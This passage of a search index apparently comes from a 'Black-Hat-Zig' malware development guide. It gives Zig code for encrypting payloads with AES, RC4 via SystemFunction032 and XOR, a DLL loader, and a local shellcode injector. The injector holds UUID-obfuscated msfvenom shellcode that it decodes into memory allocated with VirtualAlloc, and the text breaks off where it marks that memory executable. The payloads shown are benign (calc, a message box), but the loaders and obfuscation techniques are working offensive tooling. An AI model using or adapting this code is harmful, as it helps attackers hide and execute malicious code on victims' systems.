};\n    defer allocator.free(p_plaintext);\n\n    printHexData(\"p_key\", &amp;p_key);\n    printHexData(\"p_iv\", &amp;p_iv);\n    printHexData(\"ciphertext\", &amp;ciphertext);\n    printHexData(\"PlainTextInBytes\", p_plaintext);\n    print(\"PlainTextDecoded: {s}\\n\\n\", .{p_plaintext});\n\n    // --- ENCRYPTION PART EXAMPLE ---\n    print(\"--- ENCRYPTION PART EXAMPLE ---\\n\\n\", .{});\n\n    const plaintext_data = [_]u8{ 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e, 0x20, 0x50, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x20, 0x67, 0x69, 0x76, 0x65, 0x20, 0x42, 0x6c, 0x61, 0x63, 0x6b, 0x2d, 0x48, 0x61, 0x74, 0x2d, 0x5a, 0x69, 0x67, 0x20, 0x61, 0x20, 0x73, 0x74, 0x61, 0x72, 0x21 };\n\n    var key: [KEY_SIZE]u8 = undefined;\n    var iv: [IV_SIZE]u8 = undefined;\n    try generateRandomBytes(&amp;key);\n    try generateRandomBytes(&amp;iv);\n\n    printHexData(\"pKey\", &amp;key);\n    printHexData(\"pIv\", &amp;iv);\n    printHexData(\"PlainTextInBytes\", &amp;plaintext_data);\n    print(\"PlainTextDecoded: {s}\\n\\n\", .{plaintext_data});\n\n    const p_ciphertext = simpleEncryption(allocator, &amp;plaintext_data, &amp;key, &amp;iv) catch |err| {\n        print(\"Encryption failed: {}\\n\", .{err});\n        return;\n    };\n    defer allocator.free(p_ciphertext);\n\n    printHexData(\"CipherText\", p_ciphertext);\n\n    // --- VERIFICATION: Decrypt what we just encrypted ---\n    print(\"--- VERIFICATION ---\\n\\n\", .{});\n\n    const verification_plaintext = simpleDecryption(allocator, p_ciphertext, &amp;key, &amp;iv) catch |err| {\n        print(\"Verification decryption failed: {}\\n\", .{err});\n        return;\n    };\n    defer allocator.free(verification_plaintext);\n\n    print(\"Verification PlainText: {s}\\n\", .{verification_plaintext});\n    print(\"Original == Decrypted: {}\\n\", .{std.mem.eql(u8, &amp;plaintext_data, verification_plaintext)});\n}\n</code></pre>"},{"location":"Payload-Encryption/aes/#using-tiny-aes","title":"Using Tiny AES","text":"<p>Originl C project</p> <p>You should go to that project and download the <code>aes.h</code> &amp; <code>aes.c</code>, then put them into your <code>src</code> directory. Then you should add this to your <code>build.zig</code> to make the Zig compiler know where's your C source.</p> build.zig<pre><code>// NOTE: This allow the compiler to link the C source\nexe.addCSourceFile(.{ .file = b.path(\"src/aes.c\"), .flags = &amp;.{} });\nexe.addIncludePath(b.path(\"src\"));\nexe.linkLibC();\n</code></pre> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\nconst time = std.time;\nconst print = std.debug.print;\n\nconst c = @cImport({\n    @cInclude(\"./aes.h\");\n});\n\nconst BOOL = i32;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\nconst BYTE = u8;\n\nconst TRUE = 1;\nconst FALSE = 0;\nconst KEYSIZE = 32;\nconst IVSIZE = 16;\n\n// Zig-based random number generator (replacing srand/rand)\nvar rng_state: std.Random.DefaultPrng = undefined;\nvar rng_initialized: bool = false;\n\nfn initRng() void {\n    if (!rng_initialized) {\n        rng_state = std.Random.DefaultPrng.init(@as(u64, @bitCast(time.milliTimestamp())));\n        rng_initialized = true;\n    }\n}\n\nfn seedRng(seed: u64) void {\n    rng_state = std.Random.DefaultPrng.init(seed);\n    rng_initialized = true;\n}\n\nfn randByte() u8 {\n    if (!rng_initialized) initRng();\n    return rng_state.random().int(u8);\n}\n\n// Generate random bytes using Zig's RNG\nfn generateRandomBytes(buffer: [*]u8, size: usize) void {\n    var i: usize = 0;\n    while (i &lt; size) : (i += 1) {\n        buffer[i] = randByte();\n    }\n}\n\n// Print hex data\nfn printHexData(name: []const u8, data: [*]const u8, size: usize) void {\n    print(\"const {s} = [_]u8{{\\n\\t\", .{name});\n    var i: usize = 0;\n    while (i &lt; size) : (i += 1) {\n        if (i % 16 == 0 and i != 0) print(\"\\n\\t\", .{});\n        if (i &lt; size - 1) {\n            print(\"0x{X:0&gt;2}, \", .{data[i]});\n        } else {\n            print(\"0x{X:0&gt;2} \", .{data[i]});\n        }\n    }\n    print(\"\\n}};\\n\\n\", .{});\n}\n\n// Padding buffer function\nfn padBuffer(\n    input_buffer: [*]const u8,\n    input_buffer_size: SIZE_T,\n    output_padded_buffer: *?[*]u8,\n    output_padded_size: *SIZE_T,\n) BOOL {\n    var padded_buffer: ?[*]u8 = null;\n    var padded_size: SIZE_T = 0;\n\n    // Calculate the nearest number that is multiple of 16\n    padded_size = input_buffer_size + 16 - (input_buffer_size % 16);\n\n    // Allocating buffer of size \"padded_size\"\n    padded_buffer = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, padded_size));\n    if (padded_buffer == null) {\n        return FALSE;\n    }\n\n    // Zero the allocated buffer\n    @memset(padded_buffer.?[0..padded_size], 0);\n\n    // Copy old buffer to new padded buffer\n    @memcpy(padded_buffer.?[0..input_buffer_size], input_buffer[0..input_buffer_size]);\n\n    // Save results\n    output_padded_buffer.* = padded_buffer;\n    output_padded_size.* = padded_size;\n\n    return TRUE;\n}\n\n// Encryption example (equivalent to first C program)\nfn aesEncrypt() void {\n    print(\"=== ENCRYPTION EXAMPLE ===\\n\\n\", .{});\n\n    // \"this is plane text sting, we'll try to encrypt... lets hope everythign go well :)\" in hex\n    var data = [_]u8{ 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e, 0x20, 0x50, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x20, 0x67, 0x69, 0x76, 0x65, 0x20, 0x42, 0x6c, 0x61, 0x63, 0x6b, 0x2d, 0x48, 0x61, 0x74, 0x2d, 0x5a, 0x69, 0x67, 0x20, 0x61, 0x20, 0x73, 0x74, 0x61, 0x72, 0x21 };\n\n    // Struct needed for Tiny-AES library\n    var ctx: c.struct_AES_ctx = undefined;\n\n    var p_key: [KEYSIZE]BYTE = undefined;\n    var p_iv: [IVSIZE]BYTE = undefined;\n\n    // Seed random number generator using Zig RNG\n    seedRng(@as(u64, @bitCast(time.timestamp())));\n    generateRandomBytes(&amp;p_key, KEYSIZE);\n\n    // Use first byte of key for additional randomness in IV generation\n    seedRng(@as(u64, @bitCast(time.timestamp())) ^ p_key[0]);\n    generateRandomBytes(&amp;p_iv, IVSIZE);\n\n    // Print key and IV\n    printHexData(\"pKey\", &amp;p_key, KEYSIZE);\n    printHexData(\"pIv\", &amp;p_iv, IVSIZE);\n\n    // Initialize Tiny-AES library\n    c.AES_init_ctx_iv(&amp;ctx, &amp;p_key, &amp;p_iv);\n\n    // Variables for padded buffer\n    var padded_buffer: ?[*]u8 = null;\n    var padded_size: SIZE_T = 0;\n\n    // Check if padding is required\n    if (data.len % 16 != 0) {\n        if (padBuffer(&amp;data, data.len, &amp;padded_buffer, &amp;padded_size) == TRUE) {\n            // Encrypt the padded buffer\n            c.AES_CBC_encrypt_buffer(&amp;ctx, padded_buffer.?, @intCast(padded_size));\n            // Print encrypted buffer\n            printHexData(\"CipherText\", padded_buffer.?, padded_size);\n        }\n    } else {\n        // No padding required, encrypt data directly\n        c.AES_CBC_encrypt_buffer(&amp;ctx, &amp;data, @intCast(data.len));\n        printHexData(\"CipherText\", &amp;data, data.len);\n    }\n\n    // Free padded buffer if allocated\n    if (padded_buffer != null) {\n        _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, padded_buffer.?);\n    }\n}\n\n// Decryption example (equivalent to second C program)\nfn aesDecrypt() void {\n    print(\"=== DECRYPTION EXAMPLE ===\\n\\n\", .{});\n\n    // Key\n    const p_key = [_]u8{ 0xFD, 0x73, 0x3E, 0x2F, 0x9D, 0x1A, 0x5E, 0x17, 0x4A, 0xD4, 0x8A, 0x14, 0x9E, 0xE6, 0x99, 0x0C, 0x5E, 0x88, 0xCC, 0x92, 0xB4, 0x7E, 0x88, 0x9D, 0x03, 0x47, 0x60, 0x1A, 0x2F, 0xF6, 0xDB, 0x22 };\n    // IV\n    const p_iv = [_]u8{ 0x57, 0x0C, 0x92, 0xE0, 0xE0, 0xB9, 0x52, 0x1A, 0xE7, 0x70, 0x6A, 0xE8, 0x61, 0xF3, 0xB0, 0x52 };\n    // Encrypted data (multiples of 16 bytes)\n    var cipher_text = [_]u8{ 0xBA, 0x94, 0x8F, 0xDD, 0x42, 0xB0, 0x67, 0xB4, 0x32, 0x05, 0x08, 0x09, 0x13, 0x92, 0x9E, 0x4D, 0xF4, 0xF6, 0x38, 0xA1, 0x9A, 0x07, 0x55, 0x4B, 0xE7, 0xF3, 0x72, 0x86, 0x2D, 0xEB, 0x7E, 0xA8, 0xC7, 0xD2, 0xD6, 0xC9, 0xE5, 0x7A, 0x63, 0x09, 0x64, 0xF1, 0x16, 0xD0, 0xFB, 0x9C, 0x89, 0xFA, 0xBA, 0x45, 0x50, 0xAC, 0xE4, 0x94, 0x64, 0x4F, 0x49, 0x11, 0x31, 0x76, 0x48, 0x6E, 0x2D, 0x03 };\n    // Struct needed for Tiny-AES library\n    var ctx: c.struct_AES_ctx = undefined;\n\n    // Initialize Tiny-AES library\n    c.AES_init_ctx_iv(&amp;ctx, &amp;p_key, &amp;p_iv);\n\n    print(\"Original key:\\n\", .{});\n    printHexData(\"pKey\", &amp;p_key, p_key.len);\n    print(\"Original IV:\\n\", .{});\n    printHexData(\"pIv\", &amp;p_iv, p_iv.len);\n    print(\"Original ciphertext:\\n\", .{});\n    printHexData(\"CipherText\", &amp;cipher_text, cipher_text.len);\n\n    // Decrypt\n    c.AES_CBC_decrypt_buffer(&amp;ctx, &amp;cipher_text, @intCast(cipher_text.len));\n\n    // Print decrypted buffer\n    print(\"Decrypted data:\\n\", .{});\n    printHexData(\"PlainText\", &amp;cipher_text, cipher_text.len);\n\n    // Print as string (find null terminator or use full length)\n    var str_len: usize = 0;\n    for (cipher_text, 0..) |byte, i| {\n        if (byte == 0) {\n            str_len = i;\n            break;\n        }\n    }\n    if (str_len == 0) str_len = cipher_text.len;\n\n    print(\"Data: {s}\\n\", .{cipher_text[0..str_len]});\n}\n\npub fn main() !void {\n    print(\"Tiny-AES Zig Implementation\\n\", .{});\n    print(\"===========================\\n\\n\", .{});\n\n    // Encryption example\n    aesEncrypt();\n\n    print(\"\\n\", .{});\n\n    // Decryption example\n    aesDecrypt();\n\n    return;\n}\n</code></pre>"},{"location":"Payload-Encryption/rc4/","title":"RC4 Encryption","text":""},{"location":"Payload-Encryption/rc4/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Encryption/rc4/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst DWORD = u32;\nconst NTSTATUS = i32;\nconst PVOID = ?*anyopaque; // equivalent to C's void*\nconst BOOL = i32;\n\nconst USTRING = extern struct {\n    Length: DWORD,\n    MaximumLength: DWORD,\n    Buffer: PVOID,\n};\n\nconst fnSystemFunction032 = fn (\n    Data: *USTRING,\n    Key: *USTRING,\n) callconv(.C) NTSTATUS;\n\n/// Helper function that calls SystemFunction032 (RC4)\n/// Reference: https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/\npub fn rc4EncryptionViaSystemFunc032(\n    rc4Key: []u8,\n    payloadData: []u8,\n) bool {\n    // Prepare the USTRING structs\n    var Data = USTRING{\n        .Buffer = payloadData.ptr,\n        .Length = @intCast(payloadData.len),\n        .MaximumLength = @intCast(payloadData.len),\n    };\n    var Key = USTRING{\n        .Buffer = rc4Key.ptr,\n        .Length = @intCast(rc4Key.len),\n        .MaximumLength = @intCast(rc4Key.len),\n    };\n\n    // Convert \"Advapi32\" to UTF-16LE for LoadLibraryW\n    const advapi32_w = std.unicode.utf8ToUtf16LeStringLiteral(\"Advapi32\");\n    const advapi32 = kernel32.LoadLibraryW(advapi32_w);\n    if (advapi32 == null) {\n        std.debug.print(\"[!] LoadLibraryW failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n    defer _ = kernel32.FreeLibrary(advapi32.?);\n\n    const proc_addr = kernel32.GetProcAddress(advapi32.?, \"SystemFunction032\");\n    if (proc_addr == null) {\n        std.debug.print(\"[!] GetProcAddress failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n\n    const SystemFunction032: *const fnSystemFunction032 = @ptrCast(proc_addr);\n\n    const status: NTSTATUS = SystemFunction032(&amp;Data, &amp;Key);\n\n    if (status != 0) {\n        std.debug.print(\"[!] SystemFunction032 FAILED With Error: 0x{X:0&gt;8}\\n\", .{status});\n        return false;\n    }\n    return true;\n}\n\npub fn main() !void {\n    const stdout = std.io.getStdOut().writer();\n\n    // Example RC4 key and payload\n    var key = [_]u8{ 0x11, 0x22, 0x33, 0x44, 0x55 };\n    var data = [_]u8{ 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 0xFA, 0xCE };\n\n    try stdout.print(\"[+] Original payload: {any}\\n\", .{data});\n    try stdout.print(\"[+] RC4 key: {any}\\n\", .{key});\n\n    // Encrypt (in-place)\n    if (!rc4EncryptionViaSystemFunc032(key[0..], data[0..])) {\n        try stdout.print(\"[+] Encryption failed!\\n\", .{});\n        return;\n    }\n    try stdout.print(\"[+] Encrypted payload: {any}\\n\", .{data});\n\n    // Decrypt (RC4 is symmetric, so call again with same key)\n    if (!rc4EncryptionViaSystemFunc032(key[0..], data[0..])) {\n        try stdout.print(\"[+] Decryption failed!\\n\", .{});\n        return;\n    }\n    try stdout.print(\"[+] Decrypted payload: {any}\\n\", .{data});\n}\n</code></pre>"},{"location":"Payload-Encryption/xor/","title":"XOR Encryption","text":""},{"location":"Payload-Encryption/xor/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Encryption/xor/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\n\n/// This is the first approach to encrypt the payload.\n/// We add the index \"i\" to each iteration to make the encryption\n/// more complicated.\nfn xorWithKeyAndIndex(payload: []u8, key: u8) void {\n    for (payload, 0..) |*byte, i| {\n        // Truncate i to u8 (i mod 256), then do wrapping add with key (overflow in the sum),\n        // finally XOR the result with the payload byte.\n        byte.* = byte.* ^ (key +% @as(u8, @truncate(i)));\n    }\n}\n\n/// This is the second approach to encrypt the payload.\n/// We use a multi-bytes key and iterate each byte as different\n/// key in each iteration.\nfn xorWithMultiBytesKey(payload: []u8, key: []const u8) void {\n    const key_len = key.len;\n    if (key_len == 0) @panic(\"Key length must be greater than 0\"); // Division by zero\n\n    var j: usize = 0;\n    for (payload) |*byte| {\n        byte.* = byte.* ^ key[j];\n        j += 1;\n        if (j &gt;= key_len) {\n            j = 0;\n        }\n    }\n}\n\npub fn main() !void {\n    const stdout = std.io.getStdOut().writer();\n\n    var payload1 = [_]u8{ 0x10, 0x20, 0x30, 0x40, 0x50 };\n    const key1: u8 = 0xAA;\n    try stdout.print(\"[+] Original payload1: {any}\\n\", .{payload1});\n    // Encrypt\n    xorWithKeyAndIndex(payload1[0..], key1);\n    try stdout.print(\"[+] After xorByIKeys with key {X}: {any}\\n\", .{ key1, payload1 });\n    // Decrypt\n    xorWithKeyAndIndex(payload1[0..], key1);\n    try stdout.print(\"[+] Restored payload1: {any}\\n\\n\", .{payload1});\n\n    var payload2 = [_]u8{ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06 };\n    const key2 = [_]u8{ 0x10, 0x20, 0x30 };\n    try stdout.print(\"[+] Original payload2: {any}\\n\", .{payload2});\n    // Encrypt\n    xorWithMultiBytesKey(payload2[0..], key2[0..]);\n    try stdout.print(\"[+] After xorByInputKey with key {any}: {any}\\n\", .{ key2, payload2 });\n    // Decrypt\n    xorWithMultiBytesKey(payload2[0..], key2[0..]);\n    try stdout.print(\"[+] Restored payload2: {any}\\n\", .{payload2});\n}\n</code></pre>"},{"location":"Payload-Execution/dll/","title":"Execute Via DLL","text":""},{"location":"Payload-Execution/dll/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Execution/dll/#code-walkthrough","title":"Code Walkthrough","text":"<p>DLL loader</p> main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Windows API functions\nextern \"kernel32\" fn GetModuleFileNameA(hModule: ?windows.HMODULE, lpFilename: [*]u8, nSize: windows.DWORD) callconv(.C) windows.DWORD;\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    // Get command line arguments\n    const args = try std.process.argsAlloc(allocator);\n    defer std.process.argsFree(allocator, args);\n\n    if (args.len &lt; 2) {\n        print(\"[!] Missing Argument; Dll Payload To Run \\n\", .{});\n        print(\"Usage: {s} &lt;dll_path&gt;\\n\", .{args[0]});\n        std.process.exit(1);\n    }\n\n    const dll_path = args[1];\n    const current_pid = windows.GetCurrentProcessId();\n\n    print(\"[i] Injecting \\\"{s}\\\" To The Local Process Of Pid: {d} \\n\", .{ dll_path, current_pid });\n\n    // Check if DLL file exists and get full path\n    var full_path_buf: [windows.PATH_MAX_WIDE]u8 = undefined;\n    const full_path = std.fs.cwd().realpath(dll_path, &amp;full_path_buf) catch |err| {\n        print(\"[!] Cannot access DLL file \\\"{s}\\\": {}\\n\", .{ dll_path, err });\n        print(\"[!] Make sure the file exists and is in the current directory\\n\", .{});\n        std.process.exit(1);\n    };\n\n    print(\"[+] Full DLL path: {s}\\n\", .{full_path});\n    print(\"[+] Loading Dll... \", .{});\n\n    var open_lib = std.DynLib.open(dll_path);\n    if (open_lib) |*lib| {\n        const handle = lib.inner.dll;\n        print(\"SUCCESS!\\n\", .{});\n        print(\"[+] DLL Handle: 0x{x}\\n\", .{@intFromPtr(handle)});\n\n        // Verify the loaded module\n        var module_name: [windows.MAX_PATH]u8 = undefined;\n        const name_len = GetModuleFileNameA(handle, &amp;module_name, windows.MAX_PATH);\n        if (name_len &gt; 0) {\n            print(\"[+] Loaded module: {s}\\n\", .{module_name[0..name_len]});\n        }\n\n        print(\"[+] DLL loaded successfully! Waiting for payload execution...\\n\", .{});\n\n        // Give the DLL time to execute\n        std.time.sleep(2 * std.time.ns_per_s); // Wait 2 seconds\n\n        // Keep the DLL loaded for a bit longer\n        print(\"[+] Press &lt;Enter&gt; to unload DLL and exit... \", .{});\n        _ = std.io.getStdIn().reader().readByte() catch {};\n\n        // Unload the DLL\n        lib.close();\n        print(\"[+] DLL unloaded successfully\\n\", .{});\n\n        print(\"[+] DONE!\\n\", .{});\n    } else |_| {\n        const error_code = windows.GetLastError();\n        print(\"FAILED!\\n\", .{});\n        print(\"[!] LoadLibraryA Failed With Error: {d}\\n\", .{@intFromEnum(error_code)});\n\n        // Print common error meanings\n        switch (error_code) {\n            .FILE_NOT_FOUND =&gt; print(\"    \u2192 The system cannot find the file specified\\n\", .{}),\n            .PATH_NOT_FOUND =&gt; print(\"    \u2192 The system cannot find the path specified\\n\", .{}),\n            .MOD_NOT_FOUND =&gt; print(\"    \u2192 The specified module could not be found\\n\", .{}),\n            .BAD_EXE_FORMAT =&gt; print(\"    \u2192 Not a valid Win32 application\\n\", .{}),\n            else =&gt; print(\"    \u2192 Unknown error\\n\", .{}),\n        }\n        std.process.exit(1);\n    }\n}\n</code></pre> <p>The DLL itself.</p> root.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\n\n// Windows API types\nconst HINSTANCE = windows.HINSTANCE;\nconst DWORD = windows.DWORD;\nconst LPVOID = *anyopaque;\nconst BOOL = windows.BOOL;\n\n// DLL reasons\nconst DLL_PROCESS_ATTACH: DWORD = 1;\nconst DLL_THREAD_ATTACH: DWORD = 2;\nconst DLL_THREAD_DETACH: DWORD = 3;\nconst DLL_PROCESS_DETACH: DWORD = 0;\n\n// MessageBox constants\nconst MB_OK: u32 = 0x00000000;\nconst MB_ICONINFORMATION: u32 = 0x00000040;\n\n// Windows API functions\nextern \"user32\" fn MessageBoxA(\n    hWnd: ?windows.HWND,\n    lpText: [*:0]const u8,\n    lpCaption: [*:0]const u8,\n    uType: u32,\n) callconv(.C) i32;\n\nfn msgBoxPayload() void {\n    _ = MessageBoxA(\n        null,\n        \"Please give Black-Hat-Zig a star!\",\n        \"Malware!\",\n        MB_OK | MB_ICONINFORMATION,\n    );\n}\n\n// DllMain has to be public\npub export fn DllMain(hModule: HINSTANCE, dwReason: DWORD, lpReserved: LPVOID) callconv(.C) BOOL {\n    _ = hModule;\n    _ = lpReserved;\n\n    switch (dwReason) {\n        DLL_PROCESS_ATTACH =&gt; {\n            msgBoxPayload();\n        },\n        DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH =&gt; {\n            // Do nothing for these cases\n        },\n        else =&gt; {\n            // Handle unexpected values\n        },\n    }\n\n    return 1; // TRUE\n}\n</code></pre> <p>You should add this to your <code>build.zig</code>. You can replace the <code>payload_dll</code> to the name you like.</p> build.zig<pre><code>const payload_dll = b.addSharedLibrary(.{\n    .name = \"payload_dll\",\n    .root_source_file = b.path(\"src/root.zig\"),\n    .target = target,\n    .optimize = optimize,\n});\n\n// Link Windows libraries for the DLL\npayload_dll.linkSystemLibrary(\"kernel32\");\npayload_dll.linkSystemLibrary(\"user32\");\n</code></pre>"},{"location":"Payload-Execution/shellcode/","title":"Execute Via Shellcode","text":""},{"location":"Payload-Execution/shellcode/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Execution/shellcode/#code-walkthrough","title":"Code Walkthrough","text":"<p>The payload array and deobfuscation function is generated by ZYPE, you should go install that tool if you haven't. That will make generating encrypted/obfuscated payload to be much more easier.</p> main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Windows API types\nconst PVOID = *anyopaque;\nconst DWORD = windows.DWORD;\nconst SIZE_T = usize;\nconst PBYTE = [*]u8;\n\n// Memory protection constants\nconst MEM_COMMIT = 0x1000;\nconst MEM_RESERVE = 0x2000;\nconst PAGE_READWRITE = 0x04;\nconst PAGE_EXECUTE_READWRITE = 0x40;\n\n// Windows API functions\nextern \"kernel32\" fn GetCurrentProcessId() callconv(.C) DWORD;\nextern \"kernel32\" fn GetLastError() callconv(.C) DWORD;\nextern \"kernel32\" fn VirtualAlloc(?PVOID, SIZE_T, DWORD, DWORD) callconv(.C) ?PVOID;\nextern \"kernel32\" fn VirtualProtect(PVOID, SIZE_T, DWORD, *DWORD) callconv(.C) windows.BOOL;\nextern \"kernel32\" fn CreateThread(?windows.HANDLE, SIZE_T, *const fn (?PVOID) callconv(.C) DWORD, ?PVOID, DWORD, ?*DWORD) callconv(.C) ?windows.HANDLE;\nextern \"kernel32\" fn HeapFree(windows.HANDLE, DWORD, PVOID) callconv(.C) windows.BOOL;\nextern \"kernel32\" fn GetProcessHeap() callconv(.C) windows.HANDLE;\n\n// UUID array from the following command\n//\n// 1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin\n// 2. zype -f calc.bin -m uuid\n//\n// for more information about zype: https://github.com/cx330blake/zype\nconst UUID_ARRAY: [17][]const u8 = [_][]const u8{\n    \"E48348FC-E8F0-00C0-0000-415141505251\",\n    \"D2314856-4865-528B-6048-8B5218488B52\",\n    \"728B4820-4850-B70F-4A4A-4D31C94831C0\",\n    \"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED\",\n    \"48514152-528B-8B20-423C-4801D08B8088\",\n    \"48000000-C085-6774-4801-D0508B481844\",\n    \"4920408B-D001-56E3-48FF-C9418B348848\",\n    \"314DD601-48C9-C031-AC41-C1C90D4101C1\",\n    \"F175E038-034C-244C-0845-39D175D85844\",\n    \"4924408B-D001-4166-8B0C-48448B401C49\",\n    \"8B41D001-8804-0148-D041-5841585E595A\",\n    \"59415841-5A41-8348-EC20-4152FFE05841\",\n    \"8B485A59-E912-FF57-FFFF-5D48BA010000\",\n    \"00000000-4800-8D8D-0101-000041BA318B\",\n    \"D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF\",\n    \"C48348D5-3C28-7C06-0A80-FBE07505BB47\",\n    \"6A6F7213-5900-8941-DAFF-D563616C6300\",\n};\n\nconst NUMBER_OF_ELEMENTS: usize = 17;\n\n// Manual UUID parsing that matches Windows UuidFromStringA behavior\nfn parseUuidManual(uuid_str: []const u8, buffer: []u8) !void {\n    if (buffer.len &lt; 16) return error.BufferTooSmall;\n\n    // UUID format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n    // Split into parts: [8]-[4]-[4]-[4]-[12] = 32 hex chars + 4 hyphens\n\n    var clean_hex = std.ArrayList(u8).init(std.heap.page_allocator);\n    defer clean_hex.deinit();\n\n    // Remove hyphens to get 32 hex characters\n    for (uuid_str) |c| {\n        if (c != '-') {\n            try clean_hex.append(c);\n        }\n    }\n\n    if (clean_hex.items.len != 32) return error.InvalidUuidLength;\n\n    // Parse UUID components with correct endianness\n    // Windows UUID structure (matches GUID):\n    // - First 4 bytes (data1): Little-endian 32-bit\n    // - Next 2 bytes (data2): Little-endian 16-bit\n    // - Next 2 bytes (data3): Little-endian 16-bit\n    // - Last 8 bytes (data4): Big-endian bytes\n\n    const hex_chars = clean_hex.items;\n\n    // Data1 (4 bytes, little-endian)\n    const data1 = try std.fmt.parseInt(u32, hex_chars[0..8], 16);\n    buffer[0] = @intCast(data1 &amp; 0xFF);\n    buffer[1] = @intCast((data1 &gt;&gt; 8) &amp; 0xFF);\n    buffer[2] = @intCast((data1 &gt;&gt; 16) &amp; 0xFF);\n    buffer[3] = @intCast((data1 &gt;&gt; 24) &amp; 0xFF);\n\n    // Data2 (2 bytes, little-endian)\n    const data2 = try std.fmt.parseInt(u16, hex_chars[8..12], 16);\n    buffer[4] = @intCast(data2 &amp; 0xFF);\n    buffer[5] = @intCast((data2 &gt;&gt; 8) &amp; 0xFF);\n\n    // Data3 (2 bytes, little-endian)\n    const data3 = try std.fmt.parseInt(u16, hex_chars[12..16], 16);\n    buffer[6] = @intCast(data3 &amp; 0xFF);\n    buffer[7] = @intCast((data3 &gt;&gt; 8) &amp; 0xFF);\n\n    // Data4 (8 bytes, big-endian - byte by byte)\n    for (0..8) |i| {\n        const hex_pair = hex_chars[16 + i * 2 .. 16 + i * 2 + 2];\n        buffer[8 + i] = try std.fmt.parseInt(u8, hex_pair, 16);\n    }\n}\n\nfn uuidDeobfuscation(uuid_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {\n    const buffer_size = uuid_array.len * 16;\n    const buffer = try allocator.alloc(u8, buffer_size);\n\n    for (uuid_array, 0..) |uuid_str, i| {\n        const offset = i * 16;\n        parseUuidManual(uuid_str, buffer[offset .. offset + 16]) catch |err| {\n            std.debug.print(\"[!] Failed to parse UUID[{}]: \\\"{s}\\\" - Error: {}\\n\", .{ i, uuid_str, err });\n            allocator.free(buffer);\n            return err;\n        };\n    }\n\n    return buffer;\n}\n\n// Wait for Enter key by reading entire line\nfn waitForEnter(message: []const u8) void {\n    print(\"{s}\", .{message});\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    print(\"[i] Injecting Shellcode To Local Process Of Pid: {d} \\n\", .{GetCurrentProcessId()});\n\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Decrypt ... \");\n\n    print(\"[i] Decrypting ...\", .{});\n\n    // Manual UUID deobfuscation - no Windows API needed!\n    const p_deobfuscated_payload = uuidDeobfuscation(&amp;UUID_ARRAY, allocator) catch |err| {\n        print(\"[!] uuidDeobfuscation Failed With Error: {}\\n\", .{err});\n        std.process.exit(1);\n    };\n    defer allocator.free(p_deobfuscated_payload);\n\n    print(\"[+] DONE !\\n\", .{});\n\n    const s_deobfuscated_size = p_deobfuscated_payload.len;\n    print(\"[i] Deobfuscated Payload At : 0x{x} Of Size : {d} \\n\", .{ @intFromPtr(p_deobfuscated_payload.ptr), s_deobfuscated_size });\n\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Allocate ... \");\n\n    // Allocate memory with read/write permissions\n    const p_shellcode_address = VirtualAlloc(null, s_deobfuscated_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) orelse {\n        print(\"[!] VirtualAlloc Failed With Error : {d} \\n\", .{GetLastError()});\n        std.process.exit(1);\n    };\n\n    print(\"[i] Allocated Memory At : 0x{x} \\n\", .{@intFromPtr(p_shellcode_address)});\n\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Write Payload ... \");\n\n    // Copy the payload to allocated memory\n    @memcpy(@as([*]u8, @ptrCast(p_shellcode_address))[0..s_deobfuscated_size], p_deobfuscated_payload);\n\n    // Clear the original payload buffer\n    @memset(@as([*]u8, @ptrCast(p_deobfuscated_payload.ptr))[0..s_deobfuscated_size], 0);\n\n    // Change memory protection to executable\n    var dw_old_protection: DWORD = 0;\n    if (VirtualProtect(p_shellcode_address, s_deobfuscated_size, PAGE_EXECUTE_READWRITE, &amp;dw_old_protection) == 0) {\n        print(\"[!] VirtualProtect Failed With Error : {d} 